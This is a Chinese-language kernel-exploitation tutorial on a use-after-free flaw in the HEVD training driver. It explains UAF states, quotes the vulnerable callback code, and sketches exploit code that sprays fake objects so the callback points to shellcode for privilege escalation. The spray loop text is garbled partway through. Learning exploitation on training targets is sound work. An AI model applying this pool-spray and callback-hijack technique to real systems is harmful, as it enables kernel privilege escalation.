       +0x098 ProcessLock      : _EX_PUSH_LOCK
       +0x0a0 CreateTime       : _LARGE_INTEGER
       +0x0a8 ExitTime         : _LARGE_INTEGER
       +0x0b0 RundownProtect   : _EX_RUNDOWN_REF
       +0x0b4 UniqueProcessId  : Ptr32 Void
       +0x0b8 ActiveProcessLinks : _LIST_ENTRY
       +0x0c0 ProcessQuotaUsage : [2] Uint4B
       +0x0c8 ProcessQuotaPeak : [2] Uint4B
       +0x0d0 CommitCharge     : Uint4B
       +0x0d4 QuotaBlock       : Ptr32 _EPROCESS_QUOTA_BLOCK
       +0x0d8 CpuQuotaBlock    : Ptr32 _PS_CPU_QUOTA_BLOCK
       +0x0dc PeakVirtualSize  : Uint4B
       +0x0e0 VirtualSize      : Uint4B
       +0x0e4 SessionProcessLinks : _LIST_ENTRY
       +0x0ec DebugPort        : Ptr32 Void
       ...
       +0x2b8 SmallestTimerResolution : Uint4B
       +0x2bc TimerResolutionStackRecord : Ptr32 _PO_DIAG_STACK_RECORD
## UAF原理
如果你是一个pwn选手，那么肯定很清楚UAF的原理，简单的说，Use After Free
就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况：
  * 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。
  * 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。
  * 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。
而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling
pointer。类比Linux的内存管理机制，Windows下的内存申请也是有规律的，我们知道`ExAllocatePoolWithTag`函数中申请的内存并不是胡乱申请的，操作系统会选择当前大小最合适的空闲堆来存放它。如果你足够细心的话，在源码中你会发现在`UseUaFObject`中存在`g_UseAfterFreeObject->Callback();`的片段，如果我们将`Callback`覆盖为`shellcode`就可以提权了
    typedef struct _USE_AFTER_FREE {
        FunctionPointer Callback;
        CHAR Buffer[0x54];
    } USE_AFTER_FREE, *PUSE_AFTER_FREE;
    PUSE_AFTER_FREE g_UseAfterFreeObject = NULL;
    NTSTATUS UseUaFObject() {
        NTSTATUS Status = STATUS_UNSUCCESSFUL;
        PAGED_CODE();
        __try {
            if (g_UseAfterFreeObject) {
                DbgPrint("[+] Using UaF Object\n");
                DbgPrint("[+] g_UseAfterFreeObject: 0x%p\n", g_UseAfterFreeObject);
                DbgPrint("[+] g_UseAfterFreeObject->Callback: 0x%p\n", g_UseAfterFreeObject->Callback);
                DbgPrint("[+] Calling Callback\n");
                if (g_UseAfterFreeObject->Callback) {
                    g_UseAfterFreeObject->Callback(); // g_UseAfterFreeObject->shellcode();
                }
                Status = STATUS_SUCCESS;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            Status = GetExceptionCode();
            DbgPrint("[-] Exception Code: 0x%X\n", Status);
        }
        return Status;
    }
# 0x02：漏洞利用
## 利用思路
如果我们一开始申请堆的大小和UAF中堆的大小相同，那么就可能申请到我们的这块内存，假如我们又提前构造好了这块内存中的数据，那么当最后释放的时候就会指向我们shellcode的位置，从而达到提取的效果。但是这里有个问题，我们电脑中有许许多多的空闲内存，如果我们只构造一块假堆，我们并不能保证刚好能够用到我们的这块内存，所以我们就需要构造很多个这种堆，换句话说就是`堆海战术`吧，如果你看过0day安全这本书，里面说的堆喷射也就是这个原理。
## 利用代码
根据上面我们已经得到提权的代码，相当于我们只有子弹没有枪，这样肯定是不行的，我们首先伪造环境
    typedef struct _FAKE_USE_AFTER_FREE
    {
        FunctionPointer countinter;
        char bufffer[0x54];
    }FAKE_USE_AFTER_FREE, *PUSE_AFTER_FREE;
    PUSE_AFTER_FREE fakeG_UseAfterFree = (PUSE_AFTER_FREE)malloc(sizeof(FAKE_USE_AFTER_FREE));
    fakeG_UseAfterFree->countinter = ShellCode;
    RtlFillMemory(fakeG_UseAfterFree->bufffer, sizeof(fakeG_UseAfterFree->bufffer), 'A');
接下来我们进行堆喷射
    for (int i = 0; i Callback) {
            g_UseAfterFreeObject->Callback();
        }
    }
# 0x04：后记
提权后的效果如下  
这一篇之后我会继续写windows-kernel-exploit系列2，主要还是研究HEVD中的其他漏洞，类似的UAF漏洞可以参考我研究的[2014-4113](https://thunderjie.github.io/2019/02/21/CVE-2014-4113/#more)和我即将研究的2018-8120，最后，吹爆wjllz师傅！
参考链接：